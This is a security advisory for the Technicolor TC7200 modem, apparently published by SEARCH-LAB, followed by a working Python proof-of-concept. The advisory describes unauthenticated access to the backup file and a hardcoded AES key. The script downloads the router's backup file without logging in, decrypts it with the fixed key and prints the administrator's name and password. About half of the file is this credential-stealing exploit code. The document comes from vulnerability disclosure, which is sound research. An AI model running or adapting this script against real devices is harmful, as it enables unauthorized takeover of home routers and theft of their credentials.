@@ -1,0 +1,130 @@
+'''
+Technicolor TC7200 modem/router multiple vulnerabilities
+--------------------------------------------------------
+
+Platforms / Firmware confirmed affected:
+- Technicolor TC7200, STD6.02.11
+- Product page: http://www.technicolor.com/en/solutions-services/connected-home/broadband-devices/cable-modems-gateways/tc7200-tc7300
+
+Vulnerabilities
+---------------
+Insecure session management
+
+The web interface does not use cookies at all and does not check the IP
+address of the client. If admin login is successful, every user from the
+LAN can access the management interface.
+
+Backup file encryption uses fix password
+
+Technicolor fixed the CVE-2014-1677 by encrypting the backup file with
+AES. However, the encrypted backup file remains accessible without
+authentication and if the password is not set in the web interface a
+default password is used. So, if an attacker accesses the backup file
+without authentication, the password cannot be set, and the backup file
+can be decrypted.
+
+Timeline
+--------
+
+- 2015.07.30: We sent some new issues affecting the Ubee router and other findings in Technicolor TC7200 and Cisco EPC3925 devices to UPC
+- Between 2015.07.31 and 08.12 there were several e-mail and phone communications between technical persons from Liberty Global to clarify the findings
+- 2015.08.19: UPC sent out advisory emails to its end users to change the default WiFi passphrase
+- 2016.01.27: UPC Magyarorszag send out a repeated warning to its end users about the importance of the change of the default passphrases.
+- 2016.02.16: Face to face meeting with Liberty Global security personnel in Amsterdam headquarters
+- 2016.02.18: A proposal was sent to Liberty Global suggesting a wardriving experiment in Budapest, Hungary to measure the rate of end users who are still using the default passphrases.
+
+POC
+---
+POC script is available to demonstrate the following problems [2]:
+- Unauthenticated backup file access
+- Backup file decryption
+
+Recommendations
+---------------
+Since only the ISP can update the firmware, we can recommend for users
+to change the WiFi passphrase.
+
+Credits
+-------
+This vulnerability was discovered and researched by Gergely Eberhardt
+from SEARCH-LAB Ltd. (www.search-lab.hu)
+
+References
+----------
+[1] http://www.search-lab.hu/advisories/secadv-20160720
+[2] https://github.com/ebux/Cable-modems/tree/master/Technicolor
+'''
+#
+# POC code for Technicolor TC7200
+#
+# Demonstrates the following vulnerabilities
+#  - Unauthenticated backup file access
+#  - Backup file decryption
+#
+# Credit: Gergely Eberhardt (@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)
+#
+# Advisory: http://www.search-lab.hu/advisories/secadv-20150720
+
+import sys
+import requests
+import struct
+import binascii
+from Crypto.Cipher import AES
+
+class technicolor:
+    def __init__(self, addr, port):
+        self.addr = addr
+        self.port = port
+        self.s = requests.Session()
+
+    def getUri(self, uri):
+        return 'http://%s:%d/%s'%(self.addr,self.port,uri)
+
+    def downloadBackupFile(self):
+        r = self.s.get(self.getUri('goform/system/GatewaySettings.bin'))
+        resp = ''
+        for chunk in r:
+            resp += chunk
+        return resp
+
+    def parseBackup(self, backup):
+        p = backup.find('MLog')
+        if (p > 0):
+            p += 6
+            nh = struct.unpack('!H',backup[p:p+2])[0]
+            name = backup[p+2:p+2+nh]
+            p += 2+nh
+            ph = struct.unpack('!H',backup[p:p+2])[0]
+            pwd = backup[p+2:p+2+nh]
+            return (name,pwd)
+        return ('','')
+
+    def decryptBackup(self, backup):
+        key = binascii.unhexlify('000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F')
+        l = (len(backup)/16)*16
+        cipher = AES.new(key, AES.MODE_ECB, '\x00'*(16))
+        plain = cipher.decrypt(backup[0:l])
+        return plain
+
+
+#------------------------------------
+
+if (len(sys.argv) < 2):
+    print 'technicolor_tc7200_poc.py addr [port]'
+addr = sys.argv[1]
+port = 80
+if (len(sys.argv) == 3):
+    port = int(sys.argv[2])
+
+# create technicolor object
+t = technicolor(addr, port)
+
+backup = t.downloadBackupFile()
+if (len(backup) > 0):
+    open('test.enc', 'wb').write(backup)
+    plain = t.decryptBackup(backup)
+    open('test.dec', 'wb').write(plain)
+
+    (name, pwd) = t.parseBackup(plain)
+    if (name != ''):
+        print 'admin name: %s, pwd: %s'%(name,pwd)
